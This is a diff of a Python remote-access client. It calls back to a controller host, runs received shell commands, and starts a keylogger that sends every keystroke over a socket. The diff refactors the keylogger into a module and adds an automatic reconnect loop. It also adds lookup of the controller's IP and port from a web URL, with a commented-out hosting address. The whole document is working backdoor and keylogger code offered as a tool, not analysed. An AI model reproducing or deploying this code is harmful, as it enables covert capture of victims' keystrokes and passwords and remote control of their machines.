@@ -1,53 +1,26 @@
+#---- INSTALLED SCRIPTS ----#
 import socket, os, subprocess, pathlib, platform, logging
 from threading import Thread
 from pynput.keyboard import Key, Listener
 
+#---- USER SCRIPTS ----#
+import keylogClient, findIP
+
 received = b''
 currentPath = os.getcwd()
 
-keylogRunning = False
+#---- SERVER SETTINGS ----#
+#If no url is defined(empty string), it will default to default port
+#portUrl = "http://galacticdiversion.x10host.com/port"
+portUrl = ""
+defPort = 4444
 
-killThread = False
+#If no url is defined(empty string), it will default to given ip
+#url = "http://galacticdiversion.x10host.com/ip"
+url = ""
+ip = 'localhost'
 
-def on_press(key):
-	global kS
-	global killThread
-	global keylogRunning
-	if killThread:
-		keylogRunning = False
-		send = kS.send("kill".encode('utf8'))
-		killThread = False
-		return False
-	# if key == Key.esc:
-	# 	return False
-	send = kS.send(str(key).encode('utf8'))
-	
-
-def keylogger(kPort):
-	global kS
-	global host
-	global keylogRunning
-
-	if keylogRunning:
-		return
-	else:
-		print("Starting Keylogger")
-	
-	
-	kNotConnected = True
-	while kNotConnected:
-		kS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-		try:
-			kS.connect((host,kPort))
-			kNotConnected = False
-			keylogRunning = True
-		except:
-			kNotConnected = True
-
-	with Listener(on_press=on_press) as listener:
-		listener.join()
-		
+quitting = False
 
 def checkCom(command):
 	global received
@@ -67,13 +40,15 @@ def runShell(command):
 	return stdout_value
 
 def receive():
-	global received
-	global currentPath
-	global killThread
-	global keylogRunning
+	global received, currentPath, quitting
+
 	received = s.recv(1024).decode('utf8')
 	
 	if checkCom('quit'):
+		quitting = True
+		s.close()
+
+	elif checkCom('reset'):
 		s.close()
 
 	elif checkCom('shell'):
@@ -122,21 +97,21 @@ def receive():
 		f.close()
 
 	elif checkCom('keylog'):
-		if received and not keylogRunning:
-			process = Thread(target=keylogger, args=[int(received)])
+		if received and not keylogClient.keylogRunning:
+			process = Thread(target=keylogClient.start, args=[int(received), host])
 			process.daemon = True
 			process.start()
 			#process.join()
 			args = 'Starting Keylogger'
-		elif keylogRunning and received:
+		elif keylogClient.keylogRunning and received:
 			args = 'Keylogger Already Running'
 		else:
 			args = 'Provide Valid Port'
 
 
 	elif checkCom('killkeylog'):
-		if keylogRunning:
-			killThread = True
+		if keylogClient.keylogRunning:
+			keylogClient.kill()
 			args = 'Killing Keylogger'
 		else:
 			args = 'Keylogger Not Running'
@@ -161,14 +136,9 @@ def connect():
 	notConnected = True
 	while notConnected:
 		os.system('cls')
-		global host
-		global port
-		global s
+		global host, port, s
 
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-		port = 4444
-		host = 'localhost'
 
 		try:
 			print('[!] Trying To Connect To %s:%s'%(host, port))
@@ -179,6 +149,23 @@ def connect():
 		except Exception as e:
 			print('Could Not Connect: ', e)
 
-connect()
-receive()
-s.close()
+def reset():
+	global received, currentPath, host, url, ip, port, portUrl, defPort
+	print("Resetting")
+	keylogClient.kill()
+	received = b''
+	currentPath = os.getcwd()
+	host = findIP.getIP(url, ip)
+	port = findIP.getIP(portUrl, defPort)
+
+while not quitting:
+	reset()
+	print("Starting Client")
+	try:
+		connect()
+		receive()
+		s.close()
+	except:
+		print("Cut Out Of Loop")
+
+	
